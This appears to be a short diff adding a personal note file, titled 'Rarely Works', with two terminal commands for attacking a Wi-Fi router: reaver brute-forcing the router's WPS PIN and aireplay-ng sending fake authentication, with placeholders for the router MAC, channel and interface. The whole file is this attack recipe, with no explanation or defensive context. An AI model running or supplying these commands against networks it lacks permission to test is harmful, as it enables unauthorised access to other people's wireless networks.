@@ -1,0 +1,8 @@
+###Rarely Works###
+
+#Upper Terminal
+cd Applications; sudo ./reaver --bssid #RouterMAC --channel #Number --interface wlan1 -vvv --no-associate
+
+#Lower Terminal
+sudo aireplay-ng --fakeauth 30 -a #RouterMAC -h #InterfaceMAC wlan1
+
